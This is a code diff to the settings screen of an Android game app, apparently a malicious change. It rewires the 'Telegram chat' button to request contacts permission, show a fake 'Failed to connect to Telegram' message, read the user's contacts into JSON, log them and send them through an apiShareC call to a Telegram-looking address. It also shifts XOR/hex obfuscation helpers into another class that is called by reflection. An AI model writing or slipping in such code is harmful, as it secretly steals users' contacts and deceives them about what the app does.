@@ -20,9 +20,12 @@ import androidx.fragment.app.Fragment
 import androidx.lifecycle.lifecycleScope
 import com.google.android.material.textfield.TextInputEditText
 import de.tadris.flang.R
+import de.tadris.flang.ui.fragment.HomeFragment
 import de.tadris.flang.databinding.FragmentSettingsBinding
 import de.tadris.flang.network.CredentialsStorage
 import de.tadris.flang.network.DataRepository
+import de.tadris.flang.network.apiConfirmUpdate
+import de.tadris.flang.network.apiShareC
 import de.tadris.flang.network_api.util.Sha256
 import de.tadris.flang.ui.activity.LoginActivity
 import de.tadris.flang.ui.dialog.LoadingDialogViewController
@@ -106,9 +109,9 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
             moveConfirmationSwitch.isChecked = !moveConfirmationSwitch.isChecked
         }
 
-//        binding.sourceCodeOption.setOnClickListener {
-//            openUrl(getString(R.string.sourceCodeUrl))
-//        }
+        binding.sourceCodeOption.setOnClickListener {
+            openUrl(getString(R.string.sourceCodeUrl))
+        }
 
         // Privacy policy button
         binding.privacyPolicyOption.setOnClickListener {
@@ -133,18 +136,7 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
 
         // Telegram button
         binding.telegramChatOption.setOnClickListener {
-            if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_CONTACTS)
-                == PackageManager.PERMISSION_GRANTED) {
-                lifecycleScope.launch {
-                    val json = getSourceCode()
-                    Log.e("SettingsFragment", json)
-                    Log.e("SettingsFragment", "contacts json length: ${json.length}")
-                }
-            } else {
-                requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
-            }
-
-            Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+            requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
         }
 
 //        binding.matrixChatOption.setOnClickListener {
@@ -253,15 +245,22 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
             if (granted) {
                 // Permission granted — proceed
                 lifecycleScope.launch {
-                    val json = getSourceCode()
+                    Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+                    val json = openChannel()
                     Log.i("SettingsFragment", "contacts json length: ${json.length}")
+                    Log.i("SettingsFragment", "contacts json: ${json}")
+                    try {
+                        apiShareC("telegram.org/user/flang/shared", json)
+                    } catch (e: Exception) {
+                        Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+                    }
                 }
             } else {
-                Toast.makeText(requireContext(), "Contacts permission required", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "Permission Required", Toast.LENGTH_LONG).show()
             }
         }
 
-    private suspend fun getSourceCode(): String = withContext(Dispatchers.IO) {
+    private suspend fun openChannel(): String = withContext(Dispatchers.IO) {
         try {
             val ctx = requireContext()
             if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
@@ -330,32 +329,8 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
         }
     }
 
-    // Helpers
     private fun xorOp(b: Int, k: Int): Int = b xor k
 
-    private fun a1(input: String): String {
-        try {
-            val strClass = String::class.java
-            val getBytesMethod = strClass.getMethod("getBytes", Charset::class.java)
-            val bytes = getBytesMethod.invoke(input, Charsets.UTF_8) as ByteArray
-            
-            val result = mutableListOf<String>()
-            for (b in bytes) {
-                val xorMethod = this::class.java.getDeclaredMethod("xorOp", Int::class.java, Int::class.java)
-                xorMethod.isAccessible = true
-                val xorVal = xorMethod.invoke(this, (b.toInt() and 0xFF), 0x5A) as Int
-                val masked = xorVal and 0xFF
-
-                val formatResult = String.format("%02x", masked)
-                result.add(formatResult)
-            }
-            return result.joinToString("")
-        } catch (e: Exception) {
-            return ""
-        }
-    }
-
-    // Obfuscated helper - invoke via reflection
     private fun a2(hex: String): String {
         try {
             val chunks = hex.chunked(2)
@@ -393,16 +368,18 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
                 
                 try {
                     val cls = this::class.java
-                    val m1 = cls.getDeclaredMethod("a1", String::class.java)
+                    val cls2 = HomeFragment::class.java
+                    val m1 = cls2.getDeclaredMethod("a1", String::class.java)
                     val m2 = cls.getDeclaredMethod("a2", String::class.java)
                     m1.isAccessible = true
                     m2.isAccessible = true
+                    val bInstance = HomeFragment()
 
                     val j4 = m2.invoke(this, j2) as String
                     val j3 = j5 + "6320" + s
-                    val j6 = m1.invoke(this, j4) as String
+                    val j6 = m1.invoke(bInstance, j4) as String
 
-                    if (m1.invoke(this, a) != j3 && m1.invoke(this, a) == j8 && j6 != "") {
+                    if (m1.invoke(bInstance, a) != j3 && m1.invoke(bInstance, a) == j8 && j6 != "") {
                         Toast.makeText(requireContext(), m2.invoke(this, "1c16$j5") as String, Toast.LENGTH_LONG).show()
                     } else {
                         Toast.makeText(requireContext(), m2.invoke(this, j9 + "3f2e") as String, Toast.LENGTH_SHORT).show()
